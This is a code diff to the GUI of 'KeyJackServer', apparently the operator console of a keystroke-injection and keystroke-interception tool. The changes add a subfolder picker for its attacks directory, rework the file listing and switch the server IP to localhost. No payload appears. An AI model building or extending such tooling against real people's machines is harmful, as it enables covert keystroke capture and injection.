@@ -5,7 +5,7 @@ from tkinter import filedialog, font, messagebox, ttk
 import os
 import shutil
 
-IP = '172.20.10.5'
+IP = 'localhost'
 PORT = 10319
 
 class KeyJackServer:
@@ -25,8 +25,7 @@ class KeyJackServer:
         self.update_file_description(selected)
 
     def get_full_path(self, selected_item):
-        relative_path = selected_item.strip()
-        return os.path.join(self.attacks_dir, relative_path)
+        return os.path.join(self.attacks_dir, selected_item.strip())
 
     def setup_gui(self):
         self.root = tk.Tk()
@@ -73,12 +72,17 @@ class KeyJackServer:
         repo_frame = ttk.Frame(self.injection_frame)
         repo_frame.pack(pady=10, padx=10, fill=tk.X)
 
+        self.second_combobox = ttk.Combobox(repo_frame, width=50, state="readonly")
+        self.second_combobox.set("Select a subfolder")
+        self.second_combobox.bind("<<ComboboxSelected>>", self.on_second_select)
+        self.second_combobox.pack(side=tk.LEFT, expand=True, fill=tk.X)
+
         self.file_combobox = ttk.Combobox(repo_frame, width=50, state="readonly")
         self.file_combobox.set("Select a file")
         self.file_combobox.bind("<<ComboboxSelected>>", self.on_select)
         self.file_combobox.pack(side=tk.LEFT, expand=True, fill=tk.X)
 
-        self.refresh_button = ttk.Button(repo_frame, text="Refresh", command=self.load_file_list)
+        self.refresh_button = ttk.Button(repo_frame, text="Refresh", command=self.load_subfolder_list)
         self.refresh_button.pack(side=tk.RIGHT, padx=5)
 
         self.upload_button = ttk.Button(repo_frame, text="Upload File", command=self.upload_file)
@@ -96,7 +100,17 @@ class KeyJackServer:
                                          command=self.handle_sending)
         self.execute_button.pack(pady=10)
 
-        self.load_file_list()
+        self.load_subfolder_list()
+
+    def on_second_select(self, event):
+        selected = self.second_combobox.get()
+        if selected == 'All Files':
+            self.load_file_list(None)
+        else:
+            full_path = os.path.join(self.attacks_dir, selected)
+            print(f"Selected subfolder: {full_path}")
+            self.load_file_list(selected)
+        self.update_file_description(f"Selected subfolder: {selected}")
 
     def setup_keystrokes_tab(self):
         self.intercepted_keystrokes_area = tk.Text(self.keystrokes_frame, height=20, bg='#000000', fg='#00FF00',
@@ -107,19 +121,17 @@ class KeyJackServer:
                                       command=self.save_keystrokes)
         self.save_button.pack(pady=10)
 
-    def load_file_list(self):
-        if not os.path.exists(self.attacks_dir):
-            os.makedirs(self.attacks_dir)
-
+    def load_file_list(self, subfolder=None):
         options = []
-        for root, dirs, files in os.walk(self.attacks_dir):
-            level = root.replace(self.attacks_dir, '').count(os.sep)
-            indent = ' ' * 4 * level
-            subdir = os.path.relpath(root, self.attacks_dir)
-            if subdir != '.':
-                options.append(f"{indent}{subdir}/")
+        if subfolder and subfolder != 'All Files':
+            search_dir = os.path.join(self.attacks_dir, subfolder)
+        else:
+            search_dir = self.attacks_dir
+
+        for root, dirs, files in os.walk(search_dir):
             for f in files:
-                options.append(f"{indent}{os.path.join(subdir, f)}")
+                relative_path = os.path.relpath(os.path.join(root, f), self.attacks_dir)
+                options.append(relative_path)
 
         self.file_combobox['values'] = options
         if options:
@@ -127,7 +139,17 @@ class KeyJackServer:
             self.update_file_description(options[0])
         else:
             self.file_combobox.set('')
-            self.file_description.config(text="No files found in the attacks directory.")
+            self.file_description.config(text="No files found in the selected directory.")
+
+    def load_subfolder_list(self):
+        subfolders = ['All Files']
+        for item in os.listdir(self.attacks_dir):
+            if os.path.isdir(os.path.join(self.attacks_dir, item)):
+                subfolders.append(item)
+
+        self.second_combobox['values'] = subfolders
+        self.second_combobox.set('All Files')
+        self.on_second_select(None)
 
     def update_file_description(self, selected_file):
         if selected_file:
@@ -135,7 +157,7 @@ class KeyJackServer:
             if os.path.isfile(file_path):
                 try:
                     with open(file_path, 'r') as file:
-                        content = file.read(100)  # Read first 100 characters
+                        content = file.read(100)
                     self.file_description.config(text=f"File: {file_path}\nPreview: {content}...")
                 except Exception as e:
                     self.file_description.config(text=f"Error reading file: {str(e)}")
